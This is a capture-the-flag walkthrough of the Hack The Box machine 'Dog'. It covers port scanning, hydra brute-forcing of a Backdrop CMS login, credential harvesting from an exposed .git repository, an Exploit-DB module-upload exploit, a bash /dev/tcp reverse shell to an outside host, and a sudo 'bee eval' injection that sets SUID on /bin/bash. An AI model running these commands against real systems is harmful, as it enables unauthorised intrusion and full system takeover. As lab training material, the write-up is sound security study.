---
title: Dog
draft: true
tags:
---

# Enumeration
## Port Scanning
- Using [[content/Tools/Nmap|Nmap]] to get opened ports
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.58 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250309162846.png]]

- Now lets get the service and version and run some useful scripts
```bash
nmap -p22,80 -sVC -Pn -n --min-rate 5000 10.10.11.58 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250309162953.png]]

## Web site
- The nmap's report give us useful information `http://10.10.11.58/robots.txt`
>[!example]- Result
>![[Pasted image 20250309163239.png]]

- Getting the technologies using [[whatweb]] [[wappanalyzer]], and researching 
>[!example]- Result
>![[Pasted image 20250309163543.png]]
>![[Pasted image 20250309163556.png]]

- I had try to use brute force using [[hydra]] in order to enumerate valid users cause the login page leaks this info in the status massage box, but i get blocked..., however i got a valid user
```bash
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p pass 10.10.11.58 http-post-form "/?q=user/login:name=^USER^&pass=pass&form_build_id=form-24NFExATxWVRWGiNeIWZQjueSYlgO1ZC_CLT-eGBrdQ&form_id=user_login&op=Log+in:Sorry, unrecognized username."
```

>[!example]- Result
>![[Pasted image 20250309183304.png]]
>![[Pasted image 20250309183300.png]]

- now we can try to brute force the password, but the account get blocked
```bash
hydra -l john -P /usr/share/wordlists/rockyou.txt 10.10.11.58 http-post-form "/?q=user/login:name=john&pass=^PASS^&form_build_id=form-24NFExATxWVRWGiNeIWZQjueSYlgO1ZC_CLT-eGBrdQ&form_id=user_login&op=Log+in:Sorry, incorrect password" -t 2
```
>[!example]- Result
>![[Pasted image 20250309183702.png]]

- We can use [[BackDropScan.py]] to get more info about the CMS
```bash
python BackDropScan.py --url http://dog.htb/ --version
```
>[!example]- Result
>![[Pasted image 20250309192747.png]]

Version: `1.27.1`
- User enumeration
```bash
python BackDropScan.py --url http://dog.htb/ --userslist /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt --userenum
```
>[!example]- Result
>![[Pasted image 20250309192955.png]]

User: `john`

- There is a `.git` directory so lets download and check it, but nothing especial
```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.10.11.58/.git/

git reset --hard
# para extraer los commit ocultos si los hubiera
# git fsck --lost-found
# git log --all --graph

```

- As well we can use [[git-dumper]] to dump the git repository (useful tool to reconstruct the entire git repo)
```bash
git-dumper http://10.10.11.58/.git/ ./git_backup
```

- Checking the files we can see the password
>[!example]- Result
>![[Pasted image 20250309200232.png]]

- Perfect now we have a password but doesn't works with `john` username so we go to enumerate exhaustively the git repo
```bash
find . -type f -print0 | xargs -0 grep -i "@DOG.htb"
```
>[!example]- Result
>![[Pasted image 20250309201237.png]]

Username: `tiffany@dog.htb`

- This user math with the password
>[!example]- Result
>![[Pasted image 20250309202138.png]]

- we can see more users
>[!example]- Result
>![[Pasted image 20250309203935.png]]


# Exploitation
- In order to get remote access we can [exploit](https://www.exploit-db.com/exploits/52021) a vulnerability of this version of backdrop
```bash
python 52021.py http://dog.htb
```

This script create a custom module with a malicious `.php` to get a interactive command execution

- we have to create a `.tar` (by default the exploit create a `.zip`) and upload it into `http://dog.htb/?q=admin/modules/install`
```bash
tar -cvf shell.tar shell/shell.info shell/shell.php
```
>[!example]- Result
>![[Pasted image 20250309202813.png]]
>![[Pasted image 20250309203145.png]]
>![[Pasted image 20250309205623.png]]

- now the can get a ReverShell
```shell
/bin/bash -i >& /dev/tcp/10.10.16.6/4444 0>&1
```
>[!example]- Result
>![[Pasted image 20250309210003.png]]


# Privilege Escalation
## Enumeration
- We can see that there are a MySQL service, (we now the credentials)
```bash
netstat -nat
mysql -u root -p
select name,pass,mail,login from users;
```
- listing home folder
```bash
ls /home
```
>[!example]- Result
>![[Pasted image 20250309214145.png]]

credentials: `root:BackDropJ2024DS2024`
>[!example]- Result
>![[Pasted image 20250309210516.png]]

- After testing some thing i can get access via SSH reusing the found credentials `johncusack:BackDropJ2024DS2024``
```bash
ssh johncusack@10.10.11.58
```

- Looks like we can execute this command as root 
```bash
sudo -l
bee version
```
>[!example]- Result
>![[Pasted image 20250309214427.png]]
>![[Pasted image 20250309214616.png]]


- This tool is built on PHP so we can try to inject some PHP command in order to get a elevated shell
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('chmod u+s /bin/bash');"
bash -p
```
>[!example]- Result
>![[Pasted image 20250309220442.png]]

